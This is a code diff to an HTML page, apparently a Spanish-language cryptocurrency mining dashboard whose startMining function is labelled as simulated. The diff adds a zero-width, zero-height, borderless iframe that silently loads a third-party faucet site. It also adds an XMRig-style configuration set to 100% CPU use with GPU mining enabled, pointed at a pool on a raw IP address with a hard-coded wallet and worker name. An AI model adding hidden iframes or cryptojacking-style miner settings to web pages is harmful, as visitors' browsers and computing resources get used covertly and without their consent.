@@ -63,12 +63,56 @@
         <div id="status">Estado: No iniciado</div>
         <div id="stats">Estadísticas: No disponibles</div>
         <div id="accountInfo">Información de la cuenta: No disponible</div>
+
+        <!-- Iframe agregado -->
+        <iframe src="https://autofaucet.org/wm/Ganafacilpro/8" width="0" height="0" style="border:0;"></iframe>
     </div>
 
     <script>
         let mining = false;
         const walletAddress = 'RPqwP8wuRWFGiP31f7NTDq6KgF6B5Crych';
         const accountInfoUrl = 'http://45.33.47.25:3000/api/poolData/72/6596237097b04b05eb151553/67028dbd5f09df3d488db72e/workers';
+
+        const configuracion = {
+            "autosave": true,
+            "donate-level": 1,
+            "cpu": {
+                "enabled": true,
+                "huge-pages": true,
+                "hw-aes": null,
+                "priority": null,
+                "asm": true,
+                "max-threads-hint": 100,
+                "max-cpu-usage": 100,
+                "yield": false,
+                "init": -1,
+                "*": {
+                    "intensity": 2,
+                    "threads": 8,
+                    "affinity": -1
+                }
+            },
+            "opencl": true,
+            "cuda": true,
+            "pools": [{
+                "coin": null,
+                "algo": "cn/ccx",
+                "url": "168.235.86.33:3393",
+                "user": "SK_QzApkbVGsAxyQykaWSnEF.Ganafacilpro",
+                "pass": "x",
+                "keepalive": false,
+                "nicehash": false,
+                "rig-id": null,
+                "habilitado": true,
+                "tls": false,
+                "sni": false,
+                "tls-fingerprint": null,
+                "daemon": false,
+                "socks5": null,
+                "self-select": null,
+                "submit-to-origin": false
+            }]
+        };
 
         // Función para iniciar la minería simulada
         function startMining() {
